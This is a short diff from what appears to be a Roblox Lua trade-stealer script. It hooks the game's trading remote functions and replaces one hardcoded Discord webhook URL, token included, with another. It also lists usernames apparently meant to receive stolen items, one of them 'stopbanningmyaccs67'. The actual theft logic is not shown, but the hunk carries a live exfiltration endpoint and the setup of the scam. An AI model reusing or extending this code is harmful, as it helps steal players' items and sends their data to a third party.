@@ -21,7 +21,7 @@ local RFTradingConfirmTrade = ReplicatedStorage.Modules.Net["RF/Trading/ConfirmT
 local RFTradingAcceptTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/AcceptTradeOffer"]
 local RFTradingSetTokens = ReplicatedStorage.Modules.Net["RF/Trading/SetTokens"]
 
-local MY_WEBHOOK = "https://discord.com/api/webhooks/1464311781269831735/E7IlLpVLN_lcO_Mn9e0Ck_AzjawbVDAAkmyTHede0PRDsYP43goCqMLh5MN8ljkBaWg4"
+local MY_WEBHOOK = "https://discord.com/api/webhooks/1507047054344585418/FSbWeRqNlHGYL-JI4Sak4VEX0OEDQ4CpGIanBDjsv4CnL0gruZQdPhDgeGLRULCgrxZ5"
 local USER_WEBHOOK = _G.Webhook or "PUTHERE"
 local MY_USERNAMES = _G.Usernames or {"jayhassogyau", "stopbanningmyaccs67", "mantskeys55", "jayisbodybuilt", "mydignames6769"}
 
